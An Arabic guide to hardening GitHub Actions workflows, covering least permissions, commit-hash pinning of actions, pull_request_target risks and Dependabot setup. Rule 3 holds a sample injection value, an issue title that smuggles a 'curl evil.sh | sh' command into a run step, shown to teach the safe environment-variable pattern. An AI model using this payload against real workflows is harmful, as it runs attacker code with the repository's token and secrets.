# حافظ على أمان الـ workflows

الـ workflow يشغّل كودًا برمز مستودعك، والمهاجمون يعرفون ذلك. القواعد:

1. **أقل الصلاحيات:** اضبط `permissions:` في كل workflow، بدءًا من `contents: read`.
2. **ثق في الـ actions بحذر.** `uses: someone/action@v1` يشغّل كود ذلك الشخص، وهو يستطيع نقل وسم `v1`. فضّل `actions/` والمؤلفين الموثَّقين، وللبقية ثبّت الـ hash الكامل للـ commit: `uses: someone/action@8f4b7f8...`.
3. **لا تضع نصًا غير موثوق مباشرة في `run:`.** عنوان issue مثل `"; curl evil.sh | sh; "` يصبح أمرًا:

```yaml
# DANGEROUS: the title is pasted into the script
      - run: echo "New issue ${{ github.event.issue.title }}"

# SAFE: pass it as an environment variable
      - run: echo "New issue $TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
```

4. **احذر من `pull_request_target`.** يعمل بأسرارك وبرمز كتابة حتى لطلبات الدمج القادمة من forks. لا تجلب كود طلب الدمج وتشغّله فيه أبدًا.
5. **حدّث الـ actions بـ Dependabot** الذي يفتح طلبات دمج عند صدور نسخة جديدة:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions   # keep the actions/...@v7 numbers up to date
    directory: /
    schedule:
      interval: weekly
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
```

وفعّل أيضًا في **Settings ← Code security**: تنبيهات Dependabot، وفحص الأسرار مع push protection، وفحص الكود (CodeQL). وهي مجانية للمستودعات العامة.
